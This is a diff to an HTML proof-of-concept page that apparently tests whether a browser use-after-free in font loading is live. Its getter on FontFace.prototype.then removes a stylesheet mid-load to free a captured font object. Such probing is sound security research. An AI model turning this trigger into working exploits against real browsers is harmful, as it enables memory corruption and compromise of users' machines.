@@ -1,4 +1,4 @@
-﻿<!doctype html>
+<!doctype html>
 <html>
 <head>
 <meta charset="utf-8">
@@ -43,12 +43,16 @@ function trigger() {
     log('triggering now - if the page dies, the bug is LIVE');
     document.getElementById('st').textContent = 'TRIGGERED';
 
-    var f = new FontFace('probeA', 'local(NonexistentFont)', {});
+    var f = new FontFace('probeA',
+        'url(https://fonts.gstatic.com/s/roboto/v32/KFOmCnqEu92Fr1Mu4mxKKTU1Kg.woff2)', {});
     document.fonts.add(f);
 
+    var getterFired = 0;
     Object.defineProperty(FontFace.prototype, 'then', {
       configurable: true,
       get: function () {
+        getterFired++;
+        log('GETTER FIRED #' + getterFired + ' - re-entrancy path ACTIVE');
         // re-entrancy: free the CSSFontFace captured by matchingFaces...
         var s = document.getElementById('s0');
         if (s) s.remove();
